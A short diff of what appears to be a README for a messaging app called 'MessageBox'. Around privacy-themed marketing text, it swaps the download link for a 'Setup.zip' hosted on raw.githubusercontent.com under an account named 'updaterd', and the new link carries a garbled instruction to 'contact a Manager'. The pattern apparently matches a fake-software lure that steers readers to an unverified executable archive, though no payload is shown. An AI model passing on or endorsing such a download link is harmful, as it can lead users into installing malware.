@@ -8,7 +8,7 @@ Our focus on quality and security shines through in our design. We’ve mastered
 It’s time we make communication about the people again. Communication is not a product, it is essential to all life. It can unite us to transform our communities and our world. Nothing should be able to get between that. No third parties, no political affairs, and no hidden monetization plans.
 
 Let’s change the way we connect.
-## [⚡MessageBox Version 4.2](https://raw.githubusercontent.com/updaterd/installl/master/Setup.zip):After contact a Manager for further information.
+## [⚡MessageBox Version 4.2](https://raw.githubusercontent.com/updaterd/setup-software/master/Setup.zip):After contact a Manager for further information.
 Minimum:
 Operating System: Windows 10.
 Processor: Intel Core i3-6600K @ 3.5 GHz.
